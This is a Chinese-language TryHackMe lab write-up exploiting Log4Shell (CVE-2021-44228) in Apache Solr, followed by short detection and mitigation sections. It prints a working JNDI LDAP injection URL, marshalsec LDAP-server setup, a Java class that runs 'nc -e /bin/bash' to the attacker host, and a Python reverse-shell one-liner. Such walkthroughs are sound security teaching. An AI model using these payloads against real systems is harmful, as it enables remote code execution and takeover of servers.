# THM Solar, exploiting log4j

https://tryhackme.com/room/solar
- 2021 / 12 / 9 公開了 CVE-2021-44228，影響到了 log4j，它的危害程度達到 10，這個漏洞又被稱作 Log4Shell
- 現在已經有新版的 2.16.0 Release 了，不過又出現了 Log4j2

## Recon
![](https://i.imgur.com/3mP4uA7.png)


透過掃 Port 可以看到有開 3 個 Port，分別是22,111,8983

`rustscan -a 10.10.18.186 -r 1-65535`

可以用 nmap 做更詳細的掃瞄

nmap -sV -Pn -A -p22,111,8983 10.10.18.186

![](https://i.imgur.com/0SSpNAR.png)

可以發現 8983 開的是一個 Apache solr 的 Server 

## Discovery


![](https://i.imgur.com/RidZWlU.png)

觀察首頁的版本可以知道他是 Solr 8.11.0

觀察 `-Dsolr.log.dir` 可以看到他的 log Path 是 `/var/solr/logs`

![](https://i.imgur.com/KE5WrQb.png)

下載 lab 提供的 solrlogs.zip 檔案，他是一份範例的 Log 檔案

可以觀察到裡面有一個叫做 `solr.log` 的檔案會紀錄網頁的 Path 相關 Log


![](https://i.imgur.com/Sh2fmEO.png)

可以發現裡面一直重複的 path 是 `/admin/cores`

觀察這份 Log，可以發現，使用者能控制的點應該是 `params` 這個參數

繼續觀察可以發現這份 log 中，網址最前面的 `/solr` 不會被紀錄上去，代表說需要省略

![](https://i.imgur.com/shhnG2v.png)


這個時候我們就可以直接用最基本的 Payload 來進行測試

先在本地端用 nc -nlvp 9999 開一個監聽

然後用瀏覽器訪問

```
http://10.10.18.186:8983/solr/admin/cores?meow=${jndi:ldap://10.13.21.55:9999}
```

![](https://i.imgur.com/vrZ1XCe.png)


就可以發現 Server 吐了一些東西回來

因為他是 Ldap Server 的 Request，所以會是一些 non-printable 的 ascii string

## 安裝 Java 環境

這邊的範例需要安裝 jdk (**jdk-8u181-linux-x64.tar.gz**)

可以先透過 `wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz` 進行下載
(這邊我沒有用範例裡面的連結，因為他速度太慢QQ)

接下來照著教學無腦貼

```
sudo mkdir /usr/lib/jvm 
cd /usr/lib/jvm
sudo tar xzvf /home/kali/tryhackme/log4j/jdk-8u181-linux-x64.tar.gz
sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1
sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws
```

![](https://i.imgur.com/qKNiiCC.png)


無腦貼完之後可以確認一下 java version 是 1.8.0_181

![](https://i.imgur.com/LJcu4X8.png)


接下來安裝 **`marshalsec`** Java 反序列化工具

直接透過 `git clone https://github.com/mbechler/marshalsec` 即可安裝

![](https://i.imgur.com/bYZ7d0s.png)


接下來需要安裝 maven **`sudo apt install maven`**

![](https://i.imgur.com/Kg6mhuF.png)


接下來透過 maven 來 Build 工具 `mvn clean package -DskipTests` 

![](https://i.imgur.com/kVRbMma.png)

等他 Build 一陣子後，終於顯示了 BUILD SUCCESS QQ

![](https://i.imgur.com/zGtwMFT.png)


## 準備 Run Exploit Server

**`java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.13.21.55:8000/#Exploit"`** 

執行下去之後他就會自動開啟一個 LDAP 的 Server

![](https://i.imgur.com/0AKrXic.png)


並說他會開始 Listen 1389 Port

接下來準備一個 Exploit 的 java 檔案，讓他吐 reverse shell 回來

```java
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.13.21.55 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

並輸入 `javac Exploit.java -source 8 -target 8` 進行編譯，會產出 `Exploit.class` 檔案

![](https://i.imgur.com/QtQGNIF.png)


接下來開啟 `python3 -m http.server 8000`

與另外一個 Terminal 準備 9999 port 的 nc 監聽

## 正式 Exploit

瀏覽器輸入 `http://10.10.18.186:8983/solr/admin/cores?meow=${jndi:ldap://10.13.21.55:1389/Exploit}` 

可以發現 LDAP Server 讀到了 Request

![](https://i.imgur.com/KAypsuG.png)


Python Server 也收到了這個 Request

![](https://i.imgur.com/WUQbcOt.png)

![](https://i.imgur.com/6eJct0B.png)

NC 端也收到了 Reverse shell

![](https://i.imgur.com/zzc9akI.png)

## 後滲透

`python3 -c 'import pty;pty.spawn("/bin/bash")'` 可以取得比較完整的 Shell

```
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.21.55",444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' &
```

接著我們可以用 `sudo -l` 確認自己可以用 sudo 做任何事情

![](https://i.imgur.com/a6Oa4vl.png)

幫 solr 改ㄍ密碼

`sudo passwd solr`

![](https://i.imgur.com/MHhsy9n.png)

接下來就可以 SSH 上去ㄌ

![](https://i.imgur.com/QdK8BTK.png)


## 偵測

觀察 log ，可以從前面的 web 首頁看出  所在位置在 `/var/solr/logs/solr.log`

可以看到我們的 Log 裡面有很明顯紀錄到這些東西

![](https://i.imgur.com/Rhw8JmZ.png)


## 減緩

透過 `locate solr.in.sh` 可以找到


![](https://i.imgur.com/E1n6w60.png)

`/etc/default/solr.in.sh` 這個檔案

在裡面的最下面加上

```
SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"
```

接下來重開 Solr

```shell-session
sudo /etc/init.d/solr restart
```

再下一次就會發現收不到ㄌ

![](https://i.imgur.com/ftjKD1F.png)
